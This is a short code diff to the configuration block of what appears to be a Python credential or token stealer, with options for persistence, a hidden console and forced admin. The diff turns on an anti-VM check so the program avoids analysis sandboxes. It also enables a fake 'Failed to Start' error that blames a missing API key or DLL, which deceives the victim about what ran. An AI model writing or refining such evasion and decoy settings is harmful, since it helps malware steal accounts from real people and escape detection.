@@ -13,11 +13,11 @@ config = {
     'persist': True,
     'keep-alive': False,  
     'hideconsole': True, 
-    'antivm': False,  
+    'antivm': True,  
     'force_admin': False, 
     'black_screen': False, 
-    'error': False, 
-    'error_message': 'Failed to Start Lilith Pannel\nPlease note if this keeps happening you do not have The API or strg08.DLL\n',
+    'error': True, 
+    'error_message': 'Failed to Start\nPlease note if this keeps happening you do not have a API key or strg08.DLL\n',
 }
 class functions(object):
     def getHeaders(self, token:str=None, content_type="application/json") -> dict:
